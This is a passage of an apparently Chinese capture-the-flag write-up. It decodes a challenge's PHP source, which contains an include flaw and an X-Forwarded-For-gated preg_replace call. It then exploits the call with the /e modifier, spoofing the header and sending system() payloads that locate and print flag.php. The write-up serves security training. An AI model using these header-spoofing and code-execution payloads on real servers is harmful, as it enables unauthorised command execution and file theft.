WUoKTs/PjwvcD4KICAgIDxiciAvPjxiciAvPjxiciAvPjxiciAvPgoKPD9waHAKCn1lbHNlewoKPz4KICAgICAgICA8YnIgLz48YnIgLz48YnIgLz48YnIgLz4KICAgICAgICA8ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlciI+CiAgICAgICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgICAgICAgIDw/cGhwCgogICAgICAgICAgICAgICAgaWYgKHN0cnBvcygkcGFnZSwgJ2lucHV0JykgPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgZGllKCk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKHN0cnBvcygkcGFnZSwgJ3RhOnRleHQnKSA+IDApIHsKICAgICAgICAgICAgICAgICAgICBkaWUoKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoc3RycG9zKCRwYWdlLCAndGV4dCcpID4gMCkgewogICAgICAgICAgICAgICAgICAgIGRpZSgpOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkcGFnZSA9PT0gJ2luZGV4LnBocCcpIHsKICAgICAgICAgICAgICAgICAgICBkaWUoJ09rJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaW5jbHVkZSgkcGFnZSk7CiAgICAgICAgICAgICAgICAgICAgZGllKCk7CiAgICAgICAgICAgICAgICA/PgogICAgICAgIDwvcD4KICAgICAgICA8YnIgLz48YnIgLz48YnIgLz48YnIgLz4KCjw/cGhwCn19CgoKLy/mlrnkvr/nmoTlrp7njrDovpPlhaXovpPlh7rnmoTlip/og70s5q2j5Zyo5byA5Y+R5Lit55qE5Yqf6IO977yM5Y+q6IO95YaF6YOo5Lq65ZGY5rWL6K+VCgppZiAoJF9TRVJWRVJbJ0hUVFBfWF9GT1JXQVJERURfRk9SJ10gPT09ICcxMjcuMC4wLjEnKSB7CgogICAgZWNobyAiPGJyID5XZWxjb21lIE15IEFkbWluICEgPGJyID4iOwoKICAgICRwYXR0ZXJuID0gJF9HRVRbcGF0XTsKICAgICRyZXBsYWNlbWVudCA9ICRfR0VUW3JlcF07CiAgICAkc3ViamVjdCA9ICRfR0VUW3N1Yl07CgogICAgaWYgKGlzc2V0KCRwYXR0ZXJuKSAmJiBpc3NldCgkcmVwbGFjZW1lbnQpICYmIGlzc2V0KCRzdWJqZWN0KSkgewogICAgICAgIHByZWdfcmVwbGFjZSgkcGF0dGVybiwgJHJlcGxhY2VtZW50LCAkc3ViamVjdCk7CiAgICB9ZWxzZXsKICAgICAgICBkaWUoKTsKICAgIH0KCn0KCgoKCgo/PgoKPC9ib2R5PgoKPC9odG1sPgo=</p></blockquote><p>简直了…居然成功了…那么下一步就是解码，审计源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">posix_setuid</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>renderer<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>webkit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>IE<span class="token punctuation">=</span>edge,chrome<span class="token punctuation">=</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1, maximum-scale<span class="token punctuation">=</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>layui/css/layui.css<span class="token punctuation">"</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>all<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>设备维护中心<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>layui-nav<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>layui-nav-item layui-this<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?page<span class="token punctuation">=</span>index<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>云平台设备维护中心<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fieldset</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>layui-elem-field layui-field-title<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>legend</span><span class="token punctuation">></span></span></span>设备列表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>legend</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fieldset</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>layui-hide<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>switchTpl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- 这里的 checked 的状态只是演示 --></span></span>        <span class="token markup">&lt;input type="checkbox" name="sex" value="<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>d.id<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>" lay-skin="switch" lay-text="开|关" lay-filter="checkDemo" <span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span> d.id==1 0003 ? 'checked' : '' <span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>layui/layui.js<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>    layui<span class="token punctuation">.</span><span class="token keyword">use</span><span class="token punctuation">(</span><span class="token string">'table'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">var</span> table <span class="token operator">=</span> layui<span class="token punctuation">.</span>table<span class="token punctuation">,</span>            form <span class="token operator">=</span> layui<span class="token punctuation">.</span>form<span class="token punctuation">;</span>        table<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            elem<span class="token punctuation">:</span> <span class="token string">'#test'</span><span class="token punctuation">,</span>            url<span class="token punctuation">:</span> <span class="token string">'/somrthing.json'</span><span class="token punctuation">,</span>            cellMinWidth<span class="token punctuation">:</span> <span class="token number">80</span><span class="token punctuation">,</span>            cols<span class="token punctuation">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">[</span>                    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; type: </span><span class="token string">'numbers'</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;,</span>                     <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; type: </span><span class="token string">'checkbox'</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;,</span>                     <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; field: </span><span class="token string">'id'</span><span class="token punctuation">,</span> title<span class="token punctuation">:</span> <span class="token string">'ID'</span><span class="token punctuation">,</span> width<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> unresize<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> sort<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;,</span>                     <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; field: </span><span class="token string">'name'</span><span class="token punctuation">,</span> title<span class="token punctuation">:</span> <span class="token string">'设备名'</span><span class="token punctuation">,</span> templet<span class="token punctuation">:</span> <span class="token string">'#nameTpl'</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;,</span>                     <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; field: </span><span class="token string">'area'</span><span class="token punctuation">,</span> title<span class="token punctuation">:</span> <span class="token string">'区域'</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;,</span>                     <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; field: </span><span class="token string">'status'</span><span class="token punctuation">,</span> title<span class="token punctuation">:</span> <span class="token string">'维护状态'</span><span class="token punctuation">,</span> minWidth<span class="token punctuation">:</span> <span class="token number">120</span><span class="token punctuation">,</span> sort<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;,</span>                     <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; field: </span><span class="token string">'check'</span><span class="token punctuation">,</span> title<span class="token punctuation">:</span> <span class="token string">'设备开关'</span><span class="token punctuation">,</span> width<span class="token punctuation">:</span> <span class="token number">85</span><span class="token punctuation">,</span> templet<span class="token punctuation">:</span> <span class="token string">'#switchTpl'</span><span class="token punctuation">,</span> unresize<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>                <span class="token punctuation">]</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            page<span class="token punctuation">:</span> <span class="token boolean">true</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;);</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;);</span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>    layui<span class="token punctuation">.</span><span class="token keyword">use</span><span class="token punctuation">(</span><span class="token string">'element'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">var</span> element <span class="token operator">=</span> layui<span class="token punctuation">.</span>element<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//导航的hover效果、二级菜单等功能，需要依赖element模块</span>        <span class="token comment" spellcheck="true">//监听导航点击</span>        element<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'nav(demo)'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token comment" spellcheck="true">//console.log(elem)</span>            layer<span class="token punctuation">.</span><span class="token function">msg</span><span class="token punctuation">(</span>elem<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;);</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;);</span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>page<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ctype_alnum</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token delimiter">?></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-align</span><span class="token punctuation">:</span>center</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lead<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$page</span><span class="token punctuation">;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span><span class="token delimiter">&lt;?php</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span><span class="token delimiter">?></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-align</span><span class="token punctuation">:</span>center</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lead<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                <span class="token delimiter">&lt;?php</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token string">'ta:text'</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token string">'text'</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'index.php'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>                    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token delimiter">?></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br >Welcome My Admin ! &lt;br >"</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pat<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$replacement</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>rep<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$subject</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>sub<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$replacement</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$subject</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$replacement</span><span class="token punctuation">,</span> <span class="token variable">$subject</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>然后发现里面有猫腻的代码：</p><pre><code>&lt;?php//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &amp;#123;echo "&lt;br &gt;Welcome My Admin ! &lt;br &gt;";$pattern = $_GET[pat];$replacement = $_GET[rep];$subject = $_GET[sub];if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &amp;#123;    preg_replace($pattern, $replacement, $subject);&amp;#125;else&amp;#123;    die();&amp;#125;&amp;#125;?&gt;</code></pre><p>分析preg_replace函数：</p><pre class=" language-php"><code class="language-php">函数作用：搜索subject中匹配pattern的部分， 以replacement进行替换。<span class="token variable">$pattern</span><span class="token punctuation">:</span> 要搜索的模式，可以是字符串或一个字符串数组。<span class="token variable">$replacement</span><span class="token punctuation">:</span> 用于替换的字符串或字符串数组。<span class="token variable">$subject</span><span class="token punctuation">:</span> 要搜索替换的目标字符串或字符串数组。</code></pre><p>preg_replace函数存在命令执行特性</p><p>本题此处主要考察的是preg_replace函数在使用/e模式的时候，会导致代码执行产生问题</p><blockquote><p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p><p>当pattern指明<code>/e</code>标志时 ,preg_replace()会将replacement部分的代码当作PHP代码执行(简单的说就是将replacement参数值放入eval()结构中) </p></blockquote><p>接着就可以利用XFF攻击进行了~</p><p>1.访问者的IP为127.0.0.1即可以用admin的身份进入页面</p><p>修改：X-Forward-For: 127.0.0.1</p><p>变成管理员</p><p>2./e利用（preg_replace）</p><p>审计代码中可以看到有三个参数：pat、rep、sub</p><blockquote><p> 其实利用<code>preg_replace</code>中<code>/e</code>标志执行代码并不算是一个漏洞 , 而只是一个特性 . <code>/e</code>参数也已经在PHP 7中被取消了 . 这里可以执行任意代码是因为该函数参数可以由攻击者任意构造</p></blockquote><p>查看phpinfo()</p><blockquote><p> Payload : <strong><code>?pat=/test/e&amp;rep=phpinfo()&amp;sub=test</code></strong> </p></blockquote><p>查看system()执行系统命令</p><pre><code>Payload:?pat=/test/e&amp;rep=system('find%20/%20-iname%20flag')&amp;sub=test</code></pre><p>url中不能出现空格，所以要把空格要用%20或者用”+”替换</p><p>然后会发现一个文件目录 <strong><code>/var/www/html/s3chahahaDir/flag/</code></strong> ！这个目录存在有与flag相关的文件。</p><p>那么就查看该文件是否真的与flag相关</p><pre><code>Payload:?pat=/test/e&amp;rep=system('ls%20/var/www/html/s3chahahaDir/flag/')&amp;sub=test</code></pre><p>然后出现了一个flag.php</p><p>接着！</p><p>读取flag.php即可！</p><pre><code>Payload:?pat=/test/e&amp;rep=system('ls%20/var/www/html/s3chahahaDir/flag/flag.php')&amp;sub=test</code></pre><p>（据说：也可以通过php://filter来读取flag.php，结果是一样的）</p><pre><code>Payload:?pat=/test/e&amp;rep=system('cat%20/var/www/html/s3chahahaDir/flag/flag.php')&amp;sub=test</code></pre><p>接着查看源代码即可获得flag</p><p><img src="2.PNG"></p><p>接着本题就到此结束了。</p><p>本题思路清晰明了。</p><p><a href="https://www.jianshu.com/p/c70b7ab32015">https://www.jianshu.com/p/c70b7ab32015</a></p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><a href="https://www.php.net/manual/zh/book.filter.php">https://www.php.net/manual/zh/book.filter.php</a></p><p><a href="http://www.guildhab.top/?p=481">http://www.guildhab.top/?p=481</a></p><p><a href="https://www.jianshu.com/p/5a502873635b">https://www.jianshu.com/p/5a502873635b</a></p><p><a href="https://blog.csdn.net/ncafei/article/details/62085462">https://blog.csdn.net/ncafei/article/details/62085462</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove(); 